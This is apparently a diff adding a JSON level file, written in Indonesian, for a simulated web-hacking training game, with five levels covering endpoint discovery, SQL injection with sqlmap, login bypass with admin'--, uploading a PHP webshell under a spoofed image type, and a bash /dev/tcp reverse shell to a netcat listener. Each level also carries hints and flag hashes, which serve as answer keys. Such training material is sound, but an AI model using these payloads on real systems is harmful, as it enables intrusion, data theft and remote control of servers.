@@ -1,0 +1,417 @@
+{
+  "missionId": "mission_2",
+  "missionTitle": "Web Exploitation",
+  "domain": "web",
+  "levels": [
+    {
+      "id": "m2_l1",
+      "missionId": "mission_2",
+      "title": "Endpoint Discovery",
+      "narrative": "Mission web dimulai dari pemetaan permukaan serang. Sebelum berbicara soal SQL injection atau bypass auth, pemain harus belajar menemukan endpoint yang relevan, parameter yang menarik, dan service mana yang paling layak diserang lebih dulu.",
+      "domain": "web",
+      "difficulty": 2,
+      "topology": {
+        "nodes": [
+          {
+            "id": "node_attacker",
+            "label": "Kali Linux",
+            "type": "workstation",
+            "ip": "10.0.0.5",
+            "openPorts": [],
+            "services": [],
+            "position": { "x": 50, "y": 300 }
+          },
+          {
+            "id": "node_web_app",
+            "label": "Web Application",
+            "type": "server",
+            "ip": "192.168.50.10",
+            "openPorts": [80, 443],
+            "services": ["Apache/2.4.41", "HTTPS"],
+            "position": { "x": 300, "y": 300 }
+          },
+          {
+            "id": "node_db",
+            "label": "MySQL Database",
+            "type": "server",
+            "ip": "192.168.50.20",
+            "openPorts": [3306],
+            "services": ["MySQL/5.7.38"],
+            "position": { "x": 550, "y": 300 }
+          }
+        ],
+        "connections": [
+          { "sourceId": "node_attacker", "targetId": "node_web_app" },
+          { "sourceId": "node_web_app", "targetId": "node_db" }
+        ]
+      },
+      "objectives": [
+        {
+          "id": "obj_1",
+          "description": "Enumerasi endpoint publik pada aplikasi 192.168.50.10",
+          "isCompleted": false
+        },
+        {
+          "id": "obj_2",
+          "description": "Temukan parameter pencarian yang menerima input user secara langsung",
+          "isCompleted": false
+        },
+        {
+          "id": "obj_3",
+          "description": "Validasi bahwa endpoint pencarian menjadi jalur masuk level berikutnya dan ambil flag reconnaissance",
+          "isCompleted": false
+        }
+      ],
+      "flagHash": "c5b9e7c3ee89af26fb10a8128ebfa90a7783d3a5329872b14e7cbf13558aa97b",
+      "hints": [
+        {
+          "level": 1,
+          "text": "Gunakan curl untuk memetakan halaman utama dan endpoint yang tertaut dari respons."
+        },
+        {
+          "level": 2,
+          "text": "Fokus ke endpoint yang menerima query string seperti /search?q=test atau endpoint serupa."
+        },
+        {
+          "level": 3,
+          "text": "Setelah endpoint ditemukan, baca artefak recon lalu ambil flag reconnaissance yang menandai service tersebut sebagai target utama."
+        }
+      ],
+      "expectedCommandPath": [
+        "curl http://192.168.50.10",
+        "curl http://192.168.50.10/search?q=test",
+        "curl http://192.168.50.10/recon/flag.txt"
+      ],
+      "realWorldContext": "Web exploitation yang efektif selalu diawali endpoint discovery. Banyak kerentanan nyata tidak ditemukan karena tester terlalu cepat menebak exploit tanpa memahami route, parameter, dan perilaku aplikasi terlebih dahulu.",
+      "recommendedTools": ["curl"]
+    },
+    {
+      "id": "m2_l2",
+      "missionId": "mission_2",
+      "title": "SQL Injection",
+      "narrative": "Setelah endpoint penting ditemukan, fokus beralih ke SQL injection dasar. Level ini sengaja dibuat langsung dan jelas: pemain menguji parameter rentan, menggunakan automation secukupnya, lalu membaca data flag dari database target.",
+      "domain": "web",
+      "difficulty": 2,
+      "topology": {
+        "nodes": [
+          {
+            "id": "node_attacker",
+            "label": "Kali Linux",
+            "type": "workstation",
+            "ip": "10.0.0.5",
+            "openPorts": [],
+            "services": [],
+            "position": { "x": 50, "y": 300 }
+          },
+          {
+            "id": "node_forum",
+            "label": "Search Gateway",
+            "type": "server",
+            "ip": "192.168.60.15",
+            "openPorts": [80],
+            "services": ["Nginx/1.18.0"],
+            "position": { "x": 300, "y": 200 }
+          },
+          {
+            "id": "node_admin",
+            "label": "SQL Backend",
+            "type": "workstation",
+            "ip": "192.168.60.5",
+            "openPorts": [3306],
+            "services": ["MySQL Backend"],
+            "position": { "x": 300, "y": 400 }
+          }
+        ],
+        "connections": [
+          { "sourceId": "node_attacker", "targetId": "node_forum" },
+          { "sourceId": "node_forum", "targetId": "node_admin" }
+        ]
+      },
+      "objectives": [
+        {
+          "id": "obj_1",
+          "description": "Uji parameter query untuk membuktikan adanya SQL injection",
+          "isCompleted": false
+        },
+        {
+          "id": "obj_2",
+          "description": "Gunakan sqlmap untuk enumerate database yang tersedia",
+          "isCompleted": false
+        },
+        {
+          "id": "obj_3",
+          "description": "Dump data flag dari database yang teridentifikasi",
+          "isCompleted": false
+        }
+      ],
+      "flagHash": "67f8fe7e47cdfe32a71fe0f5e6d13dda53168ad9c4435ef20311eeb5cbdcf1f3",
+      "hints": [
+        {
+          "level": 1,
+          "text": "Tambahkan tanda kutip tunggal pada parameter untuk melihat apakah aplikasi memberi sinyal error SQL."
+        },
+        {
+          "level": 2,
+          "text": "Gunakan sqlmap -u \"http://192.168.60.15/search?q=test\" --dbs untuk enumerate database."
+        },
+        {
+          "level": 3,
+          "text": "Lanjutkan dengan -D ctf_db -T flags --dump untuk membaca nilai flag."
+        }
+      ],
+      "expectedCommandPath": [
+        "curl \"http://192.168.60.15/search?q=test'\"",
+        "sqlmap -u \"http://192.168.60.15/search?q=test\" --dbs",
+        "sqlmap -u \"http://192.168.60.15/search?q=test\" -D ctf_db -T flags --dump"
+      ],
+      "realWorldContext": "SQL injection tetap relevan karena banyak aplikasi internal masih merakit query secara mentah. Tool otomatis seperti sqlmap mempercepat validasi, tetapi nilai utamanya tetap berasal dari pemahaman titik injeksi dan dampak datanya.",
+      "recommendedTools": ["curl", "sqlmap"]
+    },
+    {
+      "id": "m2_l3",
+      "missionId": "mission_2",
+      "title": "Auth Bypass",
+      "narrative": "Level ini memindahkan SQL injection dari endpoint pencarian ke form login. Tujuannya bukan dump database besar, tetapi memanipulasi logika autentikasi agar pemain memahami bagaimana input yang tampak kecil bisa membuka panel admin sepenuhnya.",
+      "domain": "web",
+      "difficulty": 3,
+      "topology": {
+        "nodes": [
+          {
+            "id": "node_attacker",
+            "label": "Kali Linux",
+            "type": "workstation",
+            "ip": "10.0.0.5",
+            "openPorts": [],
+            "services": [],
+            "position": { "x": 50, "y": 300 }
+          },
+          {
+            "id": "node_login",
+            "label": "Login Portal",
+            "type": "server",
+            "ip": "192.168.70.25",
+            "openPorts": [80, 443],
+            "services": ["PHP/7.4", "Apache/2.4.41"],
+            "position": { "x": 300, "y": 300 }
+          },
+          {
+            "id": "node_admin_panel",
+            "label": "Admin Panel",
+            "type": "server",
+            "ip": "192.168.70.25",
+            "openPorts": [80],
+            "services": ["Admin Dashboard"],
+            "position": { "x": 550, "y": 300 }
+          }
+        ],
+        "connections": [
+          { "sourceId": "node_attacker", "targetId": "node_login" },
+          { "sourceId": "node_login", "targetId": "node_admin_panel" }
+        ]
+      },
+      "objectives": [
+        {
+          "id": "obj_1",
+          "description": "Analisis request login dan identifikasi parameter yang mengontrol autentikasi",
+          "isCompleted": false
+        },
+        {
+          "id": "obj_2",
+          "description": "Bypass login tanpa mengetahui password admin yang sebenarnya",
+          "isCompleted": false
+        },
+        {
+          "id": "obj_3",
+          "description": "Masuk ke dashboard admin dan ambil flag",
+          "isCompleted": false
+        }
+      ],
+      "flagHash": "2990097ee1ef31b8f4651118ac693a4c016521b9cd835c84a74ce3b69063607b",
+      "hints": [
+        {
+          "level": 1,
+          "text": "Pikirkan bentuk query login klasik yang menyandingkan username dan password dalam satu WHERE clause."
+        },
+        {
+          "level": 2,
+          "text": "Payload seperti admin'-- sering cukup untuk menonaktifkan pengecekan password jika query rentan."
+        },
+        {
+          "level": 3,
+          "text": "Gunakan curl dengan POST request untuk bypass login admin, lalu lanjutkan ke panel admin dan ambil flag."
+        }
+      ],
+      "expectedCommandPath": [
+        "curl -X POST http://192.168.70.25/login -d \"username=admin'--&password=test\"",
+        "curl http://192.168.70.25/admin",
+        "curl http://192.168.70.25/admin/flag"
+      ],
+      "realWorldContext": "Authentication bypass adalah dampak yang sangat mudah dipahami dari SQL injection. Di dunia nyata, bug seperti ini mengubah kerentanan input menjadi akses administratif penuh tanpa perlu kredensial sah.",
+      "recommendedTools": ["curl"]
+    },
+    {
+      "id": "m2_l4",
+      "missionId": "mission_2",
+      "title": "File Upload Abuse",
+      "narrative": "Setelah punya akses admin, aplikasi membuka permukaan serang lain: upload file. Level ini fokus pada pelajaran inti unrestricted upload, yaitu bagaimana validasi yang hanya mengandalkan sisi klien atau Content-Type mudah dipatahkan.",
+      "domain": "web",
+      "difficulty": 3,
+      "topology": {
+        "nodes": [
+          {
+            "id": "node_attacker",
+            "label": "Kali Linux",
+            "type": "workstation",
+            "ip": "10.0.0.5",
+            "openPorts": [],
+            "services": [],
+            "position": { "x": 50, "y": 300 }
+          },
+          {
+            "id": "node_upload_server",
+            "label": "Upload Server",
+            "type": "server",
+            "ip": "192.168.80.30",
+            "openPorts": [80, 443],
+            "services": ["PHP/8.0", "Apache/2.4.51"],
+            "position": { "x": 300, "y": 300 }
+          },
+          {
+            "id": "node_uploads_dir",
+            "label": "Uploads Directory",
+            "type": "server",
+            "ip": "192.168.80.30",
+            "openPorts": [80],
+            "services": ["File Storage"],
+            "position": { "x": 550, "y": 300 }
+          }
+        ],
+        "connections": [
+          { "sourceId": "node_attacker", "targetId": "node_upload_server" },
+          { "sourceId": "node_upload_server", "targetId": "node_uploads_dir" }
+        ]
+      },
+      "objectives": [
+        {
+          "id": "obj_1",
+          "description": "Siapkan file webshell sederhana yang bisa mengeksekusi perintah",
+          "isCompleted": false
+        },
+        {
+          "id": "obj_2",
+          "description": "Upload webshell dengan memanipulasi request agar lolos validasi lemah",
+          "isCompleted": false
+        },
+        {
+          "id": "obj_3",
+          "description": "Akses file yang terunggah dan gunakan untuk membaca flag",
+          "isCompleted": false
+        }
+      ],
+      "flagHash": "e7cb9e893c8250809a1cffe53a8e3b0b23d56cdfd82b62dbde1ae85f83b113b8",
+      "hints": [
+        {
+          "level": 1,
+          "text": "Buat webshell minimal yang mengeksekusi parameter cmd di sisi server."
+        },
+        {
+          "level": 2,
+          "text": "Gunakan curl -F dan samarkan MIME type sebagai image/jpeg untuk mem-bypass validasi lemah."
+        },
+        {
+          "level": 3,
+          "text": "Setelah upload berhasil, akses URL file yang tersimpan di /uploads/ lalu kirim parameter cmd untuk membaca flag."
+        }
+      ],
+      "expectedCommandPath": [
+        "curl -F \"file=@shell.php;type=image/jpeg\" http://192.168.80.30/upload",
+        "curl \"http://192.168.80.30/uploads/shell.php?cmd=ls\"",
+        "curl \"http://192.168.80.30/uploads/shell.php?cmd=cat+/var/www/html/flag.txt\""
+      ],
+      "realWorldContext": "Upload abuse adalah contoh klasik celah antara validasi bisnis dan eksekusi server. Begitu file dapat dipanggil kembali melalui web root, celah ini sering naik kelas menjadi remote code execution penuh.",
+      "recommendedTools": ["curl"]
+    },
+    {
+      "id": "m2_l5",
+      "missionId": "mission_2",
+      "title": "Webshell Pivot",
+      "narrative": "Penutup mission web berfokus pada operational control. Anda sudah punya webshell, sekarang tujuannya adalah mengubah foothold rapuh itu menjadi sesi yang lebih stabil dan cukup kuat untuk mengambil flag akhir dari server produksi.",
+      "domain": "web",
+      "difficulty": 4,
+      "topology": {
+        "nodes": [
+          {
+            "id": "node_attacker",
+            "label": "Kali Linux (Listener)",
+            "type": "workstation",
+            "ip": "10.0.0.5",
+            "openPorts": [4444],
+            "services": ["Netcat Listener"],
+            "position": { "x": 50, "y": 300 }
+          },
+          {
+            "id": "node_target",
+            "label": "Production Server",
+            "type": "server",
+            "ip": "192.168.90.50",
+            "openPorts": [80, 443, 8080],
+            "services": ["PHP/8.0", "Apache/2.4.51", "Node.js/16"],
+            "position": { "x": 350, "y": 300 }
+          },
+          {
+            "id": "node_internal_db",
+            "label": "Internal DB",
+            "type": "server",
+            "ip": "10.10.0.100",
+            "openPorts": [3306],
+            "services": ["MySQL/8.0"],
+            "position": { "x": 600, "y": 300 }
+          }
+        ],
+        "connections": [
+          { "sourceId": "node_attacker", "targetId": "node_target" },
+          { "sourceId": "node_target", "targetId": "node_internal_db" }
+        ]
+      },
+      "objectives": [
+        {
+          "id": "obj_1",
+          "description": "Siapkan listener pada mesin attacker untuk menerima koneksi balik",
+          "isCompleted": false
+        },
+        {
+          "id": "obj_2",
+          "description": "Gunakan webshell yang sudah ada untuk mengirim reverse shell ke attacker",
+          "isCompleted": false
+        },
+        {
+          "id": "obj_3",
+          "description": "Gunakan foothold tersebut untuk mengambil flag akhir mission dari server produksi",
+          "isCompleted": false
+        }
+      ],
+      "flagHash": "640c80667dd2767f319f7304ff65791593d4def0a4fdb265b22b182b36f3ee16",
+      "hints": [
+        {
+          "level": 1,
+          "text": "Mulai dengan listener netcat. Tanpa itu reverse shell Anda tidak punya tempat untuk mendarat."
+        },
+        {
+          "level": 2,
+          "text": "Kirim payload reverse shell melalui endpoint webshell yang sudah Anda kuasai."
+        },
+        {
+          "level": 3,
+          "text": "Setelah foothold stabil, fokus ke artefak web yang sudah terekspos. Tidak perlu TTY penuh untuk membaca flag akhir."
+        }
+      ],
+      "expectedCommandPath": [
+        "nc -lvnp 4444",
+        "curl \"http://192.168.90.50/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.0.0.5/4444+0>%261'\"",
+        "cat /var/www/html/secret/flag.txt"
+      ],
+      "realWorldContext": "Webshell jarang menjadi tujuan akhir. Di operasi nyata, attacker biasanya memakainya untuk pivot ke shell yang lebih stabil, melakukan enumerasi lokal, lalu memperluas kontrol ke sistem yang berada di belakang aplikasi web.",
+      "recommendedTools": ["curl", "nc", "cat"]
+    }
+  ]
+}
